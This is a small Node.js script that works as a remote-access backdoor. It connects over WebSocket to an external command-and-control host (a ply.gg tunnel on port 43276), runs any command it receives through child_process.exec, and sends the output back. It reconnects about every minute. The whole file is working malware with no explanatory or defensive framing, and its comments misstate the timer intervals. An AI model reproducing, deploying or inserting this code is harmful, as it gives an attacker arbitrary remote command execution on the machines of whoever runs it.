const WebSocket = require('ws');
const { exec } = require('child_process');

function connect() {
    const ws = new WebSocket('ws://en-teams.gl.at.ply.gg:43276');

    ws.on('open', () => {
        console.log('Connected to cnc');

        // Disconnect after 1 second
        setTimeout(() => {
            ws.close();
        }, 60000);
    });

    ws.on('message', (data) => {
        const message = Buffer.isBuffer(data) ? data.toString('utf8') : data;
        const command = message.trim();
        if (command.length === 0) return;

        if ('cls' === command && 'win32' === process.platform) {
            exec('cls', handleExecResponse);
        } else if ('clear' === command && ('linux' === process.platform || 'darwin' === process.platform)) {
            exec('clear', handleExecResponse);
        } else {
            exec(command, handleExecResponse);
        }

        function handleExecResponse(error, stdout, stderr) {
            if (error) {
                ws.send(JSON.stringify({ type: 'error', message: error.message }));
            }
            if (stdout) {
                ws.send(JSON.stringify({ type: 'stdout', message: stdout }));
            }
            if (stderr) {
                ws.send(JSON.stringify({ type: 'stderr', message: stderr }));
            }
        }
    });

    ws.on('close', () => console.log('Disconnected from cnc'));
    ws.on('error', () => console.log('Connection error'));
}

// Connect immediately
connect();

// Connect every 1 second
setInterval(connect, 60000);
